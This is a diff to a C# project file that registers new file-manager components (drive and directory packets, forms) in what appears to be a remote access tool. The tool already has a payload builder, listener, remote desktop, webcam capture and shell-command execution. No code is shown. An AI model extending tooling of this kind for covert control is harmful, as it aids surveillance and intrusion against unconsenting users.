@@ -54,6 +54,7 @@
   <ItemGroup>
     <Compile Include="Controllers\AuthenticationController.cs" />
     <Compile Include="Controllers\FrmBuilderController.cs" />
+    <Compile Include="Controllers\FrmFileManagerController.cs" />
     <Compile Include="Controllers\FrmListenerController.cs" />
     <Compile Include="Controllers\FrmMainController.cs" />
     <Compile Include="Controllers\FrmRemoteDesktopController.cs" />
@@ -61,17 +62,23 @@
     <Compile Include="Controllers\FrmRemoteWebcamController.cs" />
     <Compile Include="Controllers\Server\ClientMosaic.cs" />
     <Compile Include="Controllers\Server\ClientState.cs" />
+    <Compile Include="Models\RemoteDrive.cs" />
     <Compile Include="Packets\ClientPackets\GetAuthenticationResponse.cs" />
     <Compile Include="Packets\ClientPackets\GetAvailableWebcamsResponse.cs" />
     <Compile Include="Packets\ClientPackets\GetDesktopResponse.cs" />
+    <Compile Include="Packets\ClientPackets\GetDirectoryResponse.cs" />
+    <Compile Include="Packets\ClientPackets\GetDrivesResponse.cs" />
     <Compile Include="Packets\ClientPackets\GetMonitorsResponse.cs" />
     <Compile Include="Packets\ClientPackets\GetExecuteShellCmdResponse.cs" />
     <Compile Include="Packets\ClientPackets\GetWebcamResponse.cs" />
+    <Compile Include="Packets\ClientPackets\SetStatusFileManager.cs" />
     <Compile Include="Packets\PacketHandler.cs" />
     <Compile Include="Packets\ServerPackets\GetAuthentication.cs" />
     <Compile Include="Packets\IPackets.cs" />
     <Compile Include="Packets\ServerPackets\GetAvailableWebcams.cs" />
     <Compile Include="Packets\ServerPackets\GetDesktop.cs" />
+    <Compile Include="Packets\ServerPackets\GetDirectory.cs" />
+    <Compile Include="Packets\ServerPackets\GetDrives.cs" />
     <Compile Include="Packets\ServerPackets\GetMonitors.cs" />
     <Compile Include="Packets\ServerPackets\GetExecuteShellCmd.cs" />
     <Compile Include="Packets\ServerPackets\GetWebcam.cs" />
@@ -90,6 +97,12 @@
     </Compile>
     <Compile Include="Views\FrmBuilder.Designer.cs">
       <DependentUpon>FrmBuilder.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Views\FrmFileManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Views\FrmFileManager.Designer.cs">
+      <DependentUpon>FrmFileManager.cs</DependentUpon>
     </Compile>
     <Compile Include="Views\FrmMain.cs">
       <SubType>Form</SubType>
@@ -136,6 +149,9 @@
     </Compile>
     <EmbeddedResource Include="Views\FrmBuilder.resx">
       <DependentUpon>FrmBuilder.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Views\FrmFileManager.resx">
+      <DependentUpon>FrmFileManager.cs</DependentUpon>
     </EmbeddedResource>
     <EmbeddedResource Include="Views\FrmListener.resx">
       <DependentUpon>FrmListener.cs</DependentUpon>
